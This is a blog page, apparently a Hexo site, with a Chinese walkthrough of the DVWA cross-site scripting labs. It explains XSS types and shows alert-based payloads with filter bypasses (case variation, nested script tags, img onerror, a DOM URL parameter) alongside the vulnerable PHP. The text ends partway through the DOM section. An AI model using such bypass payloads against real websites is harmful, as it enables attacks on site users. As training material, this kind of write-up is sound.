@@ -1,0 +1,1161 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <title>Dvwa-XSS | ZJR&#39;blog</title>
+  <meta name="keywords" content=" XSS ">
+  <meta name="description" content="Dvwa-XSS | ZJR&#39;blog">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="description" content="跨站脚本（Cross Site Scripting）攻击，没有对web前端的输入边界进行严格的过滤是SXX漏洞形成的主要原因攻击者可以通过构造脚本语句使得输入的内容被当作HTML的一部分来执行，当用户访问到该页面时，就会触发该恶意脚本，从而获取用户的敏感数据（比如cookie数据）XSS漏洞发生在web前端，主要对网站用户造成危害，并不会直接危害服务器后台数据 XSS类型：  反射型XSS：通过X">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Dvwa-XSS">
+<meta property="og:url" content="http://zjr-g.github.io/2020/03/30/Dvwa-XSS/index.html">
+<meta property="og:site_name" content="ZJR&#39;blog">
+<meta property="og:description" content="跨站脚本（Cross Site Scripting）攻击，没有对web前端的输入边界进行严格的过滤是SXX漏洞形成的主要原因攻击者可以通过构造脚本语句使得输入的内容被当作HTML的一部分来执行，当用户访问到该页面时，就会触发该恶意脚本，从而获取用户的敏感数据（比如cookie数据）XSS漏洞发生在web前端，主要对网站用户造成危害，并不会直接危害服务器后台数据 XSS类型：  反射型XSS：通过X">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://zjr-g.github.io/2020/03/30/Dvwa-XSS/1.png">
+<meta property="og:image" content="http://zjr-g.github.io/2020/03/30/Dvwa-XSS/2.png">
+<meta property="og:image" content="http://zjr-g.github.io/2020/03/30/Dvwa-XSS/3.png">
+<meta property="og:image" content="http://zjr-g.github.io/2020/03/30/Dvwa-XSS/4.png">
+<meta property="og:image" content="http://zjr-g.github.io/2020/03/30/Dvwa-XSS/5.png">
+<meta property="og:image" content="http://zjr-g.github.io/2020/03/30/Dvwa-XSS/6.png">
+<meta property="og:image" content="http://zjr-g.github.io/2020/03/30/Dvwa-XSS/7.png">
+<meta property="og:image" content="http://zjr-g.github.io/2020/03/30/Dvwa-XSS/8.png">
+<meta property="og:image" content="http://zjr-g.github.io/2020/03/30/Dvwa-XSS/9.png">
+<meta property="og:image" content="http://zjr-g.github.io/2020/03/30/Dvwa-XSS/10.png">
+<meta property="article:published_time" content="2020-03-30T10:02:16.000Z">
+<meta property="article:modified_time" content="2020-03-30T10:13:14.274Z">
+<meta property="article:author" content="ZJR">
+<meta property="article:tag" content="XSS">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://zjr-g.github.io/2020/03/30/Dvwa-XSS/1.png">
+
+
+<link rel="icon" href="/img/avatar.jpg">
+
+<link href="/css/style.css?v=1.0.1" rel="stylesheet">
+
+<link href="/css/hl_theme/atom-light.css?v=1.0.1" rel="stylesheet">
+
+<link href="//cdn.bootcss.com/animate.css/3.5.2/animate.min.css" rel="stylesheet">
+<link href="//cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">
+
+<script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
+<script src="/js/jquery.autocomplete.min.js?v=1.0.1" ></script>
+
+<script src="//cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js"></script>
+<script>
+    hljs.initHighlightingOnLoad();
+</script>
+
+<script src="//cdn.bootcss.com/nprogress/0.2.0/nprogress.min.js"></script>
+
+
+
+<script src="//cdn.bootcss.com/jquery-cookie/1.4.1/jquery.cookie.min.js" ></script>
+
+<script src="/js/iconfont.js?v=1.0.1" ></script>
+
+<meta name="generator" content="Hexo 4.2.0"></head>
+<div style="display: none">
+  <input class="theme_disqus_on" value="false">
+  <input class="theme_preload_comment" value="false">
+  <input class="theme_blog_path" value="">
+</div>
+
+<body>
+<aside class="nav">
+    <div class="nav-left">
+        <a href="/" class="avatar_target">
+    <img class="avatar" src="/img/avatar.jpg" />
+</a>
+<div class="author">
+    <span>ZJR</span>
+</div>
+
+<div class="icon">
+    
+        
+    
+        
+        <a title="github" href="https://github.com/zjr-g" target="_blank">
+            
+                <svg class="iconfont-svg" aria-hidden="true">
+                    <use xlink:href="#icon-github"></use>
+                </svg>
+            
+        </a>
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+        <a title="email" href="mailto:zjre@qq.com" target="_blank">
+            
+                <svg class="iconfont-svg" aria-hidden="true">
+                    <use xlink:href="#icon-email"></use>
+                </svg>
+            
+        </a>
+        
+    
+        
+        <a title="qq" href="http://wpa.qq.com/msgrd?v=3&uin=1402576652&site=qq&menu=yes" target="_blank">
+            
+                <svg class="iconfont-svg" aria-hidden="true">
+                    <use xlink:href="#icon-qq"></use>
+                </svg>
+            
+        </a>
+        
+    
+        
+    
+        
+    
+</div>
+
+
+
+
+<ul>
+    <li><div class="all active">全部文章</div></li>
+    
+        
+            
+            <li><div data-rel="Tips">Tips</div>
+                
+            </li>
+            
+        
+    
+        
+            
+            <li><div data-rel="CTF">CTF</div>
+                
+            </li>
+            
+        
+    
+        
+            
+            <li><div data-rel="DVWA">DVWA</div>
+                
+            </li>
+            
+        
+    
+        
+            
+            <li><div data-rel="MySqlCourse">MySqlCourse</div>
+                
+            </li>
+            
+        
+    
+</ul>
+<div class="left-bottom">
+    <div class="menus">
+    
+    
+    
+    
+    </div>
+    <div><a  class="friends">友链</a></div>
+</div>
+<input type="hidden" id="yelog_site_posts_number" value="35">
+<input type="hidden" id="yelog_site_word_count" value="53.5k">
+<div style="display: none">
+    <span id="busuanzi_value_site_uv"></span>
+    <span id="busuanzi_value_site_pv"></span>
+</div>
+
+    </div>
+    <div class="nav-right">
+        <div class="friends-area">
+    <div class="friends-title">
+        友情链接
+        <i class="back-title-list"></i>
+    </div>
+    <div class="friends-content">
+        <ul>
+            
+            <li><a target="_blank" href="http://yelog.org/">叶落阁</a></li>
+            
+        </ul>
+    </div>
+</div>
+        <div class="title-list">
+    <form onkeydown="if(event.keyCode === 13){return false;}">
+        <input id="local-search-input" class="search" type="text" placeholder="Search..." />
+        <i class="cross"></i>
+        <span>
+            <label for="tagswitch">Tags:</label>
+            <input id="tagswitch" type="checkbox" style="display: none" />
+            <i id="tagsWitchIcon"></i>
+        </span>
+    </form>
+    <div class="tags-list">
+    
+    <li class="article-tag-list-item">
+        <a class="color1">aes加密</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color2">base64</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color3">ctf-web</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color1">BruteForce</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color5">CSPBypass</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color5">CSRF</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color4">CommandInject</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color2">FileInclude</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color1">FileUpload</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color1">InsecureCAPTCHA</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color1">JavaScript</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color5">SQLInject</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color4">XSS</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color5">WeakSessionIDs</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color4">Git</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color4">file_incloude</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color1">MySql_show</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color2">MySql_where</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color1">MySql_like</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color3">MySql_select</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color5">MySql_order by</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color3">MySql_regexp</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color3">MySql_concat</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color5">MySql_function</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color5">MySql_group by</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color3">MySql_having</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color5">MySql_subquery</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color1">MySql_jion</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color2">MySql_union</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color3">MySql_create</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color2">MySql_alter</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color3">MySql_insert</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color3">MySql_update</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color3">MySql_delete</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color5">SSIT</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color4">Markdown</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color4">zip</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color5">hexo</a>
+    </li>
+    
+    <div class="clearfix"></div>
+</div>
+
+    
+    <nav id="title-list-nav">
+        
+        <a  class="Tips "
+           href="/2020/02/18/Aes/"
+           data-tag="aes加密"
+           data-author="" >
+            <span class="post-title" title="Aes加密解析">Aes加密解析</span>
+            <span class="post-date" title="2020-02-18 11:13:30">2020/02/18</span>
+        </a>
+        
+        <a  class="CTF "
+           href="/2020/02/11/Base64/"
+           data-tag="base64"
+           data-author="" >
+            <span class="post-title" title="神奇的Base64隐写">神奇的Base64隐写</span>
+            <span class="post-date" title="2020-02-11 21:01:02">2020/02/11</span>
+        </a>
+        
+        <a  class="CTF "
+           href="/2020/02/28/CTF-web-01/"
+           data-tag="ctf-web"
+           data-author="" >
+            <span class="post-title" title="CTF-web-01">CTF-web-01</span>
+            <span class="post-date" title="2020-02-28 20:11:44">2020/02/28</span>
+        </a>
+        
+        <a  class="CTF "
+           href="/2020/03/03/CTF-web-02/"
+           data-tag="ctf-web"
+           data-author="" >
+            <span class="post-title" title="CTF-web-02">CTF-web-02</span>
+            <span class="post-date" title="2020-03-03 22:48:14">2020/03/03</span>
+        </a>
+        
+        <a  class="CTF "
+           href="/2020/03/03/CTF-web-03/"
+           data-tag="ctf-web"
+           data-author="" >
+            <span class="post-title" title="CTF-web-03">CTF-web-03</span>
+            <span class="post-date" title="2020-03-03 22:52:30">2020/03/03</span>
+        </a>
+        
+        <a  class="CTF "
+           href="/2020/03/13/CTF-web-04/"
+           data-tag="ctf-web"
+           data-author="" >
+            <span class="post-title" title="CTF-web-04">CTF-web-04</span>
+            <span class="post-date" title="2020-03-13 15:33:04">2020/03/13</span>
+        </a>
+        
+        <a  class="DVWA "
+           href="/2020/03/30/Dvwa-BruteForce/"
+           data-tag="BruteForce"
+           data-author="" >
+            <span class="post-title" title="Dvwa-BruteForce">Dvwa-BruteForce</span>
+            <span class="post-date" title="2020-03-30 10:41:17">2020/03/30</span>
+        </a>
+        
+        <a  class="DVWA "
+           href="/2020/03/30/Dvwa-CSPBypass/"
+           data-tag="CSPBypass"
+           data-author="" >
+            <span class="post-title" title="Dvwa-CSPBypass">Dvwa-CSPBypass</span>
+            <span class="post-date" title="2020-03-30 17:55:13">2020/03/30</span>
+        </a>
+        
+        <a  class="DVWA "
+           href="/2020/03/30/Dvwa-CSRF/"
+           data-tag="CSRF"
+           data-author="" >
+            <span class="post-title" title="Dvwa-CSRF">Dvwa-CSRF</span>
+            <span class="post-date" title="2020-03-30 17:58:21">2020/03/30</span>
+        </a>
+        
+        <a  class="DVWA "
+           href="/2020/03/30/Dvwa-CommandInject/"
+           data-tag="CommandInject"
+           data-author="" >
+            <span class="post-title" title="Dvwa-CommandInject">Dvwa-CommandInject</span>
+            <span class="post-date" title="2020-03-30 17:45:20">2020/03/30</span>
+        </a>
+        
+        <a  class="DVWA "
+           href="/2020/03/30/Dvwa-FileInclude/"
+           data-tag="FileInclude"
+           data-author="" >
+            <span class="post-title" title="Dvwa-FileInclude">Dvwa-FileInclude</span>
+            <span class="post-date" title="2020-03-30 18:01:08">2020/03/30</span>
+        </a>
+        
+        <a  class="DVWA "
+           href="/2020/03/30/Dvwa-FileUpload/"
+           data-tag="FileUpload"
+           data-author="" >
+            <span class="post-title" title="Dvwa-FileUpload">Dvwa-FileUpload</span>
+            <span class="post-date" title="2020-03-30 18:01:16">2020/03/30</span>
+        </a>
+        
+        <a  class="DVWA "
+           href="/2020/03/30/Dvwa-InsecureCAPTCHA/"
+           data-tag="InsecureCAPTCHA"
+           data-author="" >
+            <span class="post-title" title="Dvwa-InsecureCAPTCHA">Dvwa-InsecureCAPTCHA</span>
+            <span class="post-date" title="2020-03-30 18:01:32">2020/03/30</span>
+        </a>
+        
+        <a  class="DVWA "
+           href="/2020/03/30/Dvwa-JavaScript/"
+           data-tag="JavaScript"
+           data-author="" >
+            <span class="post-title" title="Dvwa-JavaScript">Dvwa-JavaScript</span>
+            <span class="post-date" title="2020-03-30 18:01:47">2020/03/30</span>
+        </a>
+        
+        <a  class="DVWA "
+           href="/2020/03/30/Dvwa-SQLInject/"
+           data-tag="SQLInject"
+           data-author="" >
+            <span class="post-title" title="Dvwa-SQLInject">Dvwa-SQLInject</span>
+            <span class="post-date" title="2020-03-30 18:01:58">2020/03/30</span>
+        </a>
+        
+        <a  class="DVWA "
+           href="/2020/03/30/Dvwa-XSS/"
+           data-tag="XSS"
+           data-author="" >
+            <span class="post-title" title="Dvwa-XSS">Dvwa-XSS</span>
+            <span class="post-date" title="2020-03-30 18:02:16">2020/03/30</span>
+        </a>
+        
+        <a  class="DVWA "
+           href="/2020/03/30/Dvwa-WeakSessionIDs/"
+           data-tag="WeakSessionIDs"
+           data-author="" >
+            <span class="post-title" title="Dvwa-WeakSessionIDs">Dvwa-WeakSessionIDs</span>
+            <span class="post-date" title="2020-03-30 18:02:09">2020/03/30</span>
+        </a>
+        
+        <a  class="Tips "
+           href="/2020/02/18/Git/"
+           data-tag="Git"
+           data-author="" >
+            <span class="post-title" title="Git">Git</span>
+            <span class="post-date" title="2020-02-18 19:47:13">2020/02/18</span>
+        </a>
+        
+        <a  class="Tips "
+           href="/2020/02/28/FileIncloude/"
+           data-tag="file_incloude"
+           data-author="" >
+            <span class="post-title" title="FileIncloude(常见的文件包含漏洞及PHP伪协议分析)">FileIncloude(常见的文件包含漏洞及PHP伪协议分析)</span>
+            <span class="post-date" title="2020-02-28 20:56:42">2020/02/28</span>
+        </a>
+        
+        <a  class="MySqlCourse "
+           href="/2020/01/31/MySql-Course01/"
+           data-tag="MySql_show"
+           data-author="" >
+            <span class="post-title" title="MySql(连接，创建等操作)">MySql(连接，创建等操作)</span>
+            <span class="post-date" title="2020-01-31 21:02:14">2020/01/31</span>
+        </a>
+        
+        <a  class="MySqlCourse "
+           href="/2020/02/02/MySql-Course03/"
+           data-tag="MySql_where,MySql_like"
+           data-author="" >
+            <span class="post-title" title="MySql(数据过滤)">MySql(数据过滤)</span>
+            <span class="post-date" title="2020-02-02 10:55:26">2020/02/02</span>
+        </a>
+        
+        <a  class="MySqlCourse "
+           href="/2020/02/01/MySql-Course02/"
+           data-tag="MySql_select,MySql_order by"
+           data-author="" >
+            <span class="post-title" title="MySql(select的使用)">MySql(select的使用)</span>
+            <span class="post-date" title="2020-02-01 11:12:32">2020/02/01</span>
+        </a>
+        
+        <a  class="MySqlCourse "
+           href="/2020/02/03/MySql-Course04/"
+           data-tag="MySql_regexp"
+           data-author="" >
+            <span class="post-title" title="MySql(正则表达式)">MySql(正则表达式)</span>
+            <span class="post-date" title="2020-02-03 11:22:09">2020/02/03</span>
+        </a>
+        
+        <a  class="MySqlCourse "
+           href="/2020/02/03/MySql-Course05/"
+           data-tag="MySql_concat"
+           data-author="" >
+            <span class="post-title" title="MySql(字符拼接)">MySql(字符拼接)</span>
+            <span class="post-date" title="2020-02-03 18:24:11">2020/02/03</span>
+        </a>
+        
+        <a  class="MySqlCourse "
+           href="/2020/02/04/MySql-Course06/"
+           data-tag="MySql_function"
+           data-author="" >
+            <span class="post-title" title="MySql(函数)">MySql(函数)</span>
+            <span class="post-date" title="2020-02-04 10:33:02">2020/02/04</span>
+        </a>
+        
+        <a  class="MySqlCourse "
+           href="/2020/02/05/MySql-Course07/"
+           data-tag="MySql_group by,MySql_having"
+           data-author="" >
+            <span class="post-title" title="MySql(数据分组)">MySql(数据分组)</span>
+            <span class="post-date" title="2020-02-05 09:49:48">2020/02/05</span>
+        </a>
+        
+        <a  class="MySqlCourse "
+           href="/2020/02/05/MySql-Course08/"
+           data-tag="MySql_subquery"
+           data-author="" >
+            <span class="post-title" title="MySql(子查询)">MySql(子查询)</span>
+            <span class="post-date" title="2020-02-05 11:04:05">2020/02/05</span>
+        </a>
+        
+        <a  class="MySqlCourse "
+           href="/2020/02/06/MySql-Course09/"
+           data-tag="MySql_jion"
+           data-author="" >
+            <span class="post-title" title="MySql(联结)">MySql(联结)</span>
+            <span class="post-date" title="2020-02-06 16:59:41">2020/02/06</span>
+        </a>
+        
+        <a  class="MySqlCourse "
+           href="/2020/02/07/MySql-Course10/"
+           data-tag="MySql_union"
+           data-author="" >
+            <span class="post-title" title="MySql(组合查询UNION)">MySql(组合查询UNION)</span>
+            <span class="post-date" title="2020-02-07 11:37:50">2020/02/07</span>
+        </a>
+        
+        <a  class="MySqlCourse "
+           href="/2020/02/08/MySql-Course12/"
+           data-tag="MySql_create,MySql_alter"
+           data-author="" >
+            <span class="post-title" title="MySql(创建和操纵表)">MySql(创建和操纵表)</span>
+            <span class="post-date" title="2020-02-08 10:54:47">2020/02/08</span>
+        </a>
+        
+        <a  class="MySqlCourse "
+           href="/2020/02/07/MySql-Course11/"
+           data-tag="MySql_insert,MySql_update,MySql_delete"
+           data-author="" >
+            <span class="post-title" title="MySql(增删改)">MySql(增删改)</span>
+            <span class="post-date" title="2020-02-07 12:36:57">2020/02/07</span>
+        </a>
+        
+        <a  class="Tips "
+           href="/2020/02/28/SSIT-Inject/"
+           data-tag="SSIT"
+           data-author="" >
+            <span class="post-title" title="SSIT-Inject">SSIT-Inject</span>
+            <span class="post-date" title="2020-02-28 20:52:27">2020/02/28</span>
+        </a>
+        
+        <a  class="Tips "
+           href="/2020/01/23/StudyM/"
+           data-tag="Markdown"
+           data-author="" >
+            <span class="post-title" title="LearnMarkdown">LearnMarkdown</span>
+            <span class="post-date" title="2020-01-23 00:45:22">2020/01/23</span>
+        </a>
+        
+        <a  class="Tips "
+           href="/2020/02/11/Zip/"
+           data-tag="zip"
+           data-author="" >
+            <span class="post-title" title="Zip结构及其伪加密">Zip结构及其伪加密</span>
+            <span class="post-date" title="2020-02-11 21:03:24">2020/02/11</span>
+        </a>
+        
+        <a  class="Tips "
+           href="/2020/01/24/hexo-tips-01/"
+           data-tag="hexo"
+           data-author="" >
+            <span class="post-title" title="hexo中插入本地图片">hexo中插入本地图片</span>
+            <span class="post-date" title="2020-01-24 10:13:53">2020/01/24</span>
+        </a>
+        
+    </nav>
+</div>
+    </div>
+    <div class="hide-list">
+        <div class="semicircle">
+            <div class="brackets first"><</div>
+            <div class="brackets">&gt;</div>
+        </div>
+    </div>
+</aside>
+<div class="post">
+    <div class="pjax">
+        <article id="post-Dvwa-XSS" class="article article-type-post" itemscope itemprop="blogPost">
+    
+        <h1 class="article-title">Dvwa-XSS</h1>
+    
+    <div class="article-meta">
+        
+        
+        
+        <span class="book">
+            
+                <a  data-rel="DVWA">DVWA</a>
+            
+        </span>
+        
+        
+        <span class="tag">
+            
+            <a class="color4">XSS</a>
+            
+        </span>
+        
+    </div>
+    <div class="article-meta">
+        
+        创建时间:<time class="date" title='更新时间: 2020-03-30 18:13:14'>2020-03-30 18:02</time>
+        
+    </div>
+    <div class="article-meta">
+        
+        <span>字数:3.3k</span>
+        
+        
+        <span id="busuanzi_container_page_pv">
+            阅读:<span id="busuanzi_value_page_pv">
+                <span class="count-comment">
+                    <span class="spinner">
+                      <div class="cube1"></div>
+                      <div class="cube2"></div>
+                    </span>
+                </span>
+            </span>
+        </span>
+        
+        
+    </div>
+    
+    <div class="toc-ref">
+    
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#开撸开撸"><span class="toc-text">开撸开撸</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#反射性XSS"><span class="toc-text">反射性XSS</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#一般反射型"><span class="toc-text">一般反射型</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#DOM型"><span class="toc-text">DOM型</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#存储型XSS"><span class="toc-text">存储型XSS</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#通过XSS获取COOKIE"><span class="toc-text">通过XSS获取COOKIE</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XSS防范措施"><span class="toc-text">XSS防范措施</span></a></li></ol>
+    
+<style>
+    .left-col .switch-btn,
+    .left-col .switch-area {
+        display: none;
+    }
+    .toc-level-3 i,
+    .toc-level-3 ol {
+        display: none !important;
+    }
+</style>
+</div>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>跨站脚本（Cross Site Scripting）攻击，没有对web前端的输入边界进行严格的过滤是SXX漏洞形成的主要原因<br>攻击者可以通过构造脚本语句使得输入的内容被当作HTML的一部分来执行，当用户访问到该页面时，就会触发该恶意脚本，从而获取用户的敏感数据（比如cookie数据）<br>XSS漏洞发生在web前端，主要对网站用户造成危害，并不会直接危害服务器后台数据</p>
+<p>XSS类型：</p>
+<ul>
+<li><font color=red>反射型XSS</font>：通过XSS漏洞改造带有攻击脚本的URL，发送给URL给目标，触发恶意脚本，一次性，所见即所得，一般出现在查询类页面</li>
+<li><font color=red>储查询XSS</font>：通过SXX漏洞将恶意脚本注入到服务器后台（数据库或文件中），访问到该页面触发恶意脚本，永久性，一般出现在留言板</li>
+<li><font color=red>DOM型XSS</font>：DOM（Document Object Model）-based XSS漏洞是基于文档对象模型的一种漏洞，它是通过修改页面的DOM节点而形成的（DOM xss也是一种反射型）</li>
+</ul>
+<p>注意：反射型和储查型的区别是否存在服务器上，而DOM-xss是通过修改页面的DOM节点来形成的XSS</p>
+<p>XSS漏洞测试过程：</p>
+<ol>
+<li>在目标站点上找到输入点，比如查询接口，留言板等</li>
+<li>输入一个“唯一”字符，点击提交后，查看当前状态下的源码文件</li>
+<li>通过搜索定位到唯一字符，结合唯一字符前后语法构造script，并合理对HTML标签进行闭合</li>
+<li>提交构造的script，看是否可以成功执行</li>
+</ol>
+<h2 id="开撸开撸"><a href="#开撸开撸" class="headerlink" title="开撸开撸"></a>开撸开撸</h2><p>我们使用alert()弹窗来检测是否存在此漏洞</p>
+<h3 id="反射性XSS"><a href="#反射性XSS" class="headerlink" title="反射性XSS"></a>反射性XSS</h3><h4 id="一般反射型"><a href="#一般反射型" class="headerlink" title="一般反射型"></a>一般反射型</h4><p><strong>low级别：</strong><br>直接构造一个经典的语句：<font color=red>&lt;script&gt;alert(1)&lt;/script&gt;</font><br>成功弹窗，接下来看看它的源码</p>
+<pre><code class="php">&lt;?php
+header (&quot;X-XSS-Protection: 0&quot;);
+// Is there any input?
+if( array_key_exists( &quot;name&quot;, $_GET ) &amp;&amp; $_GET[ &#39;name&#39; ] != NULL ) {
+    // Feedback for end user
+    echo &#39;&lt;pre&gt;Hello &#39; . $_GET[ &#39;name&#39; ] . &#39;&lt;/pre&gt;&#39;;
+}
+?&gt;</code></pre>
+<p>可以看到处理的代码非常简单，直接将用户的输入拼接放入了<code>pre</code>标签对里，我们构造的<code>script</code>语句可以直接被浏览器解析出来</p>
+<p><strong>medium级别：</strong><br>继续使用low级别的语句进行尝试，发现页面将script语句之间的alert(1)显示了出来，查看网页源码发现<br><img src="1.png" alt="1"><br>原来我们的<code>&lt;script&gt;</code>不见了，这就使得浏览器不能正常解析这个脚本语句了。肯定是后台将它替换了。这里很容易想到可以试试利用大小写来绕过，后台的匹配。<br>那么我们构造语句：<font color=red>&lt;sCriPt&gt;alert(1)&lt;/script&gt;</font><br>发现此时又能弹窗了，说明我们成功的绕过了检测。<br>我们来看看它后台的源码</p>
+<pre><code class="php">&lt;?php
+header (&quot;X-XSS-Protection: 0&quot;);
+// Is there any input?
+if( array_key_exists( &quot;name&quot;, $_GET ) &amp;&amp; $_GET[ &#39;name&#39; ] != NULL ) {
+    // Get input
+    $name = str_replace( &#39;&lt;script&gt;&#39;, &#39;&#39;, $_GET[ &#39;name&#39; ] );
+    // Feedback for end user
+    echo &quot;&lt;pre&gt;Hello ${name}&lt;/pre&gt;&quot;;
+}
+?&gt;</code></pre>
+<p>可以发现仍然是很简单的一些代码，这里利用了<code>str_replace</code>进行了字符串的替换，从源码可以很清楚的看到，将<code>&lt;script&gt;</code>标签替换成了空字符，相当于删除了它。<br>我们可以看到，这里仅对这个标签进行了一次检查替换，那么我们可以尝试将<code>&lt;script&gt;</code>来重新构造一下,变为<br><font color=red>&lt;scr&lt;script&gt;ipt&gt;alert(1)&lt;/script&gt;</font></p>
+<p>提交后发现也能弹窗，这是因为虽然<code>&lt;scr&lt;script&gt;ipt&gt;</code>中间的<code>&lt;script&gt;</code>被删除了，但剩下的部分又组成了<code>&lt;script&gt;</code>，这样也绕过了检测</p>
+<p><strong>high级别：</strong><br>这时前面的方法都不行了，看看网页源码<br><img src="2.png" alt="2"><br>发现我们构造的语句只剩下一个<code>&gt;</code>，我们构造的<code>script</code>语句被严格过滤了，这时我们就不能再使用<code>&lt;script&gt;</code>标签了<br>我们可以尝试利用<code>img</code>标签，如下<br><font color=red>&lt;img src=1 onerror=alert(‘xss’)&gt;</font><br>这时又能成功弹窗了，我们看看网页源码<br><img src="3.png" alt="3"><br>我们分析一下构造的语句，<code>img</code>标签是用来放图片的src后面接图片的地址，onerror后面接发生错误时执行的语句，这里很显然<code>1</code>这个地址没有图片，引发错误，接着执行了<code>alert</code>语句<br>继续查看后台源码</p>
+<pre><code class="php">&lt;?php
+header (&quot;X-XSS-Protection: 0&quot;);
+// Is there any input?
+if( array_key_exists( &quot;name&quot;, $_GET ) &amp;&amp; $_GET[ &#39;name&#39; ] != NULL ) {
+    // Get input
+    $name = preg_replace( &#39;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&#39;, &#39;&#39;, $_GET[ &#39;name&#39; ] );
+    // Feedback for end user
+    echo &quot;&lt;pre&gt;Hello ${name}&lt;/pre&gt;&quot;;
+}
+?&gt;</code></pre>
+<p>可以看到这里使用了正则表达式对我们传入的参数进行匹配过滤，但只是针对<code>&lt;script&gt;</code>做过滤</p>
+<h4 id="DOM型"><a href="#DOM型" class="headerlink" title="DOM型"></a>DOM型</h4><p>DOM是W3C标准，可以把DOM认为是页面上数据和结构的一个树形表示<br><img src="4.png" alt="4"></p>
+<p>一些关于DOM的知识补充：<br>可能触发DOM型XSS的属性：document.referer属性、window.name属性、location属性、innerHTML属性、documen.write属性</p>
+<p><strong>document 和 windows 对象：</strong><br>document表示的是一个文档对象，window表示的是一个窗口对象，一个窗口下可以有多个文档对象。<br>所以一个窗口下只有一个window.location.href，但是可能有多个document.URL、document.location.href</p>
+<p>window 对象</p>
+<ul>
+<li>它是一个顶层对象,而不是另一个对象的属性即浏览器的窗口。</li>
+<li>window.location 包含 href 属性，直接取值赋值时相当于 window.location.href</li>
+<li>window.location.href 当前页面完整 URL</li>
+</ul>
+<p>document 对象</p>
+<ul>
+<li>该对象是window和frames对象的一个属性,是显示于窗口或框架内的一个文档。</li>
+<li>document 只是属于window 的一个子对像。</li>
+<li>document.location 包含 href 属性，直接取值赋值时相当于 document.location.href</li>
+<li>document.location.href 当前页面完整 URL</li>
+</ul>
+<p>document.URL 取值时等价于 window.location.href 或 document.location.href。在某些浏览器中通过对 document.URL 赋值来实现页面跳转，但某些浏览器中不行。</p>
+<p>document.write：<br>ocument.write是JavaScript中对document.open所开启的文档流(document stream操作的API方法，它能够直接在文档流中写入字符串，一旦文档流已经关闭，那document.write就会重新利用document.open打开新的文档流并写入，此时原来的文档流会被清空，已渲染好的页面就会被清除，浏览器将重新构建DOM并渲染新的页面</p>
+<p>这些DOM知识参考自<a href="https://www.jianshu.com/p/001daa7cf1f5" target="_blank" rel="noopener">https://www.jianshu.com/p/001daa7cf1f5</a></p>
+<p><strong>low级别：</strong><br>是一个选项框，先随便选一个，然后提交，提交后好像并没有什么变化，看看网页源码<br><img src="5.png" alt="5"><br>可以看到，这里先利用document.location.href获取当前页面完整的url再使用<code>indexOf</code>函数来获取<code>default=</code>首次出现的位置加上8（indexOf返回的是<code>default=</code>这个字符的首个字符在整个url字符串里的位置，8是<code>default=</code>这个字符串的长度）之后的位置，利用<code>substring</code>函数从这个位置开始截取后面的字符串，也就是说获取<code>default=</code>后的值。并将其赋值给<code>lang</code>这个变量<br>下一句是往当前页面写入这个值，<code>decodeURL</code>函数对经过url编码后的变量进行解码<br>我们可以构造如下url<br><font color=red>xxx/?default=&lt;script&gt;alert(1)&lt;/script&gt;</font><br>成功弹窗，打开后台源码发现没有任何处理</p>
